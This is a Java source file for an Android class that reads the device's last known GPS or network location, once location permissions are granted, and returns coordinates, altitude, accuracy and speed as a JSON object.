package com.behavioralanalysis.service;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

public class Locations implements LocationListener {
    private final Context context;
    private boolean isGPSEnabled = false;
    private boolean isNetworkEnabled = false;
    private boolean canGetLocation = false;
    private android.location.Location location;
    private double latitude;
    private  double longitude;
    private float accuracy;
    private double altitude;
    private float speed;

    protected LocationManager locationManager;

    public Locations() {
        context = null;
    }

    public Locations(Context context) {
        this.context = context;
        update();
    }

    public boolean isCanGetLocation() {
        return canGetLocation;
    }

    public android.location.Location update() {
        try {
            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (locationManager != null && (isGPSEnabled || isNetworkEnabled)) {
                canGetLocation = true;
                if (context.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED &&
                context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {

                    if (isGPSEnabled) {
                        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    } else if (isNetworkEnabled) {
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }

                    if (location != null) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                        altitude = location.getAltitude();
                        accuracy = location.getAccuracy();
                        speed = location.getSpeed();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return location;
    }


    public JSONObject get() {
        JSONObject object = new JSONObject();

        if (location != null) {
            try {
                object.put("enabled", true);
                object.put("latitude", latitude);
                object.put("longitude", longitude);
                object.put("altitude", altitude);
                object.put("accuracy", accuracy);
                object.put("speed", speed);
            } catch (JSONException e) {

            }
        }

        return object;
    }

    @Override
    public void onLocationChanged(android.location.Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();
            altitude = location.getAltitude();
            accuracy = location.getAccuracy();
            speed = location.getSpeed();
        }
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }
}
